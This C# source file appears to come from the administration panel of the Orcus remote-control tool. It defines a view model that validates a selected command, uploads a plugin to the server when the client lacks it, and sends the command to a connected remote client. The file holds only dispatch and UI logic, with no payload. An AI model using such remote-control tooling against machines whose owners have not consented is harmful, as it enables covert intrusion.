using System;
using System.Collections.Generic;
using System.Windows;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Orcus.Administration.Commands.ClientCommands;
using Orcus.Administration.Core;
using Orcus.Administration.Core.CommandManagement;
using Orcus.Administration.Core.CommandManagement.View;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Plugins.PropertyGrid;
using Orcus.Plugins.StaticCommands;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    [MinimumClientVersion(14)]
    public class ClientCommandsViewModel : CommandView
    {
        private List<Guid> _availablePlugins;
        private ClientCommandsCommand _clientCommandsCommand;
        private StaticCommand _selectedStaticCommand;
        private RelayCommand _sendCommand;

        public override string Name { get; } = (string) Application.Current.Resources["Commands"];
        public override Category Category { get; } = Category.Client;

        public StaticCommand SelectedStaticCommand
        {
            get { return _selectedStaticCommand; }
            set { SetProperty(value, ref _selectedStaticCommand); }
        }

        public RelayCommand SendCommand
        {
            get
            {
                return _sendCommand ?? (_sendCommand = new RelayCommand(async parameter =>
                {
                    if (SelectedStaticCommand == null)
                        return;

                    var validationResult = SelectedStaticCommand.ValidateInput();
                    switch (validationResult.ValidationState)
                    {
                        case ValidationState.Error:
                            WindowService.ShowMessageBox(validationResult.Message,
                                (string) Application.Current.Resources["Error"],
                                MessageBoxButton.OK, MessageBoxImage.Error);
                            return;
                        case ValidationState.WarningYesNo:
                            if (WindowService.ShowMessageBox(validationResult.Message,
                                (string) Application.Current.Resources["Warning"],
                                MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes)
                                return;

                            break;
                        case ValidationState.Success:
                            break;
                        default:
                            return;
                    }

                    var plugin = StaticCommander.StaticCommands[SelectedStaticCommand.GetType()];
                    if (plugin != null)
                    {
                        if (_availablePlugins == null || !_availablePlugins.Contains(plugin.PluginInfo.Guid))
                        {
                            var isAvailable = _clientCommandsCommand.CheckPluginAvailable(plugin.PluginHash);
                            if (_availablePlugins == null)
                                _availablePlugins = new List<Guid>();

                            _availablePlugins.Add(plugin.PluginInfo.Guid);
                            if (!isAvailable)
                            {
                                if (
                                    !await
                                        ((StaticCommander) ClientController.StaticCommander).UploadPluginToServer(plugin))
                                {
                                    LogService.Error("");
                                    return;
                                }

                                var pluginId =
                                    ((ConnectionManager) ClientController.ConnectionManager).GetStaticCommandPluginId(
                                        plugin.PluginHash);
                                _clientCommandsCommand.SendCommandWithPlugin(SelectedStaticCommand, pluginId,
                                    plugin.PluginHash);
                                return;
                            }
                        }
                    }

                    _clientCommandsCommand.SendCommand(SelectedStaticCommand);
                }));
            }
        }

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            _clientCommandsCommand = ClientController.Commander.GetCommand<ClientCommandsCommand>();
        }

        protected override ImageSource GetIconImageSource()
        {
            return
                new BitmapImage(new Uri("pack://application:,,,/Resources/Images/VisualStudio/EventMoved_16x.png",
                    UriKind.Absolute));
        }
    }
}